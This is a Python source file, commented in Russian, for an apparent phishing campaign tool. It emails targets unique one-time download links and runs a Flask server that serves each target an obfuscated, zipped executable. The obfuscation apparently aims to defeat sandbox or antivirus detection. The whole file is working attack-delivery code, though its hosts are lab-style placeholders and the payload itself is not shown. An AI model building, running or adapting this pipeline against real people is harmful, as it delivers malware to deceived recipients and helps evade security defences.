import random
import string
from subprocess import check_output
import os
import threading
from time import sleep
import zipfile

from flask import Flask, abort, send_file
import smtplib
from email.mime.text import MIMEText

from Anti_Box.Obfuscator.obfuscator import obfuscator


config_url = {
    "prefics_url":"media="                              # Статичный префикс фишинговой ссылки, после него идет радномно сгенерированная строка
}

config_mail = {
    "username":"user1@exemple.com",                     # От имени кого будет отправляться сообщение
    "password":"password",                              # Пароль от данного пользователя
    "server":"192.168.1.1",                             # Адрес почтового сервера
    "fishing_server":"192.168.1.2",                     # Web сервер, откуда будет скачиваться файл (будет указан в фишинговой ссылке)
    "fishing_url":"/download",                          # Адрес url для фишинговых файлов
}
fishing_user_mail = [
    "user2@exemple.com"                                 # Пользователи, которым будут отправлены фишинговые письма
]

config_executable_file = {
    "dir":"payload/",                                   # Директория, в которой лежит исходный файл на C
    "filename_c":"test.c",                              # Файл на С, в котором находится точка фхода
    "displaying_file_user_zip":"test.zip",              # Имя файла, которое отобразится у пользователя после скачивания
    "displaying_file_user_exe":"test.exe"                # Имя файла, которое отобразится у пользователя после скачивания
}
script_dir = os.path.dirname(os.path.abspath(__file__)) + "\\" 


random_urls = {}


app = Flask(__name__)               # Создаем экземпляр приложения Flask
                                    # __name__ специальная переменная, которая содержит имя текущего модуля


def send_email(subject, message, mail_server, from_addr, to_addr, password):
    msg = MIMEText(message)                         # Текст письма
    msg['Subject'] = subject                        # Заголовок письма
    msg['From'] = from_addr                         # От кого письмо        
    msg['To'] = to_addr                             # Кому письмо
    server = smtplib.SMTP(mail_server, 587)         # Указываем параметры сервера
    
    server.starttls()                               # Устанавливаем коннект с сервером
    server.login(from_addr, password)               # Логинимся  
    server.send_message(msg)                        # Отправляем сообщение
    server.quit()                                   # разрываем соединение


def generate_random_string(length_string_output: int) -> str:
    letters = string.ascii_lowercase                                                # Получаем строку со всеми маленькими буквами английского алфавита
    random_letters = [random.choice(letters) for _ in range(length_string_output)]  # Генерируем список случайных букв указанной длины (random.choice() выбирает случайный элемент из строки letters)
    result = ''.join(random_letters)                                                # Собираем буквы в одну строку
    return result


def compiling_executable_file() -> str:

    # random_postfix = generate_random_string(10)                                                 # Генерируем рандомный постфикс для исполняемого файла
    
    # command = f"gcc {config_executable_file['dir']}{config_executable_file['filename_c']} \
    #              -o {config_executable_file['dir']}{random_postfix}.exe"                        

    # DEVNULL = open(os.devnull, 'wb')
    # check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode('utf-8')            # Компилируем исполняемый файл с рандомным именем

    # return f"{config_executable_file['dir']}{random_postfix}.exe"

    obfuscator()                                                        # Поместит в директорию payload уникальный исполняемый файл

    os.rename(f'{script_dir}{config_executable_file["dir"]}main.exe',   # Переименовываем данный исполняемый файл
              f'{script_dir}{config_executable_file["dir"]}{config_executable_file["displaying_file_user_exe"]}')

    # return f'{random_postfix}.exe'
    return config_executable_file["displaying_file_user_exe"]


def archiving_executable_file(executable_file):
    
    with zipfile.ZipFile(f'{script_dir + config_executable_file["dir"] + executable_file}.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
        arcname = os.path.basename(script_dir + config_executable_file["dir"] + executable_file)    # Только имя файла (без вложеных директорий)
        zipf.write(script_dir + config_executable_file["dir"] + executable_file, arcname=arcname)

    return f'{executable_file}.zip'


def generate_random_url(number_random_url: int):
    for i in range(number_random_url):
        random_postfix_url = generate_random_string(50)                         # Получаем радномный постфикс url адреса
        result_random_url = config_url["prefics_url"] + random_postfix_url      # Добавдяем перед ним префикс
        
        random_urls[result_random_url] = []
        random_urls[result_random_url].append(1)                                # Сохраняем его с префиком в словарь. 1 - значит что url активен и обрабатыает запрос
        
        executable_file = compiling_executable_file()

        zip_executable_file = archiving_executable_file(executable_file)
        
        random_urls[result_random_url].append(zip_executable_file)              # Добавляем вторым параметром имя файла, связанного с этим url


def start_fishing():
    
    for filename in os.listdir(f'{script_dir}{config_executable_file["dir"]}'):         # Очищаем директорию payload
        os.remove(os.path.join(f'{script_dir}{config_executable_file["dir"]}', filename))

    generate_random_url(len(fishing_user_mail)) # Получаем словарь с рандомными url и их статусом активен/не активен
    # print(random_urls)

    urls = list(random_urls.keys())             # Получаем все url адреса из словаря
    i = 0                                       # Счетчик, чтобы у каждого пользователя была уникальная ссылка

    for user_mail in fishing_user_mail:

        send_email(
            "Test massage",
            f"Hello! The test massage! http://{config_mail['fishing_server']}{config_mail['fishing_url']}/{urls[i]}",
            config_mail["server"],
            config_mail["username"],
            user_mail,
            config_mail["password"]
        )
        i += 1


# @app.route("/")                     # В данном случае маршрутизация, это связывание url с функциями обработки
#                                     # Декоратор указывает, что функция ниже обрабатывает get запросы к корневому url
# def home():
#     return("Hello World!")

# @app.route("/hello/<name>")
# def hello_name(name):
#     return f"Привет, {name}!"

@app.route("/download/<password_url>")
def download(password_url):

    urls = list(random_urls.keys())             # Получаем все url адреса из словаря
    
    if password_url in urls:                    # Если запрошенный url является одним из сгенерированных, то идем дальше
        
        if random_urls[password_url][0] == 1:   # Если статут этого url адреса активен, то идем дальше
            random_urls[password_url][0] = 0    # После это деактивируем его, чтобы второй запрос не прошел
            #return(password_url)
            return send_file(
                config_executable_file["dir"] + random_urls[password_url][1],                                 # Указвыаем путь и имя файла, который отправится пользователю, связанного с данным url
                as_attachment=True,                                               # Автоматически добавляет Content-Disposition: attachment
                download_name=config_executable_file["displaying_file_user_zip"]  # Указывает имя для скачивания (оно отобразится у пользователя)
            )
        else:
            abort(404)                          # Если url адрес деактивирован
    else:
        abort(404)                              # Если url адрес впринципе не нашелся


def start_web_server():
    print("[i] Start WEB server")
    app.run(host='127.0.0.1', port=80)  #, debug=True)


if __name__ == "__main__":

    server_thread = threading.Thread(target=start_web_server)   # Указываем функцию, которая будет вызываеться в отдельном потоке
    # server_thread.daemon = True                               # Указываем, что данный поток должен завершится при завершении основного потока (в таком случае Flask запуститься и завершит свою работу, когда завершится программа)
    server_thread.start()                                       # Запускаем данный поток

    sleep(2)    

    print("[i] Start Fishing...")
    start_fishing()

    server_thread.join()                                        # Ждем, пока поток Flask не завержится 

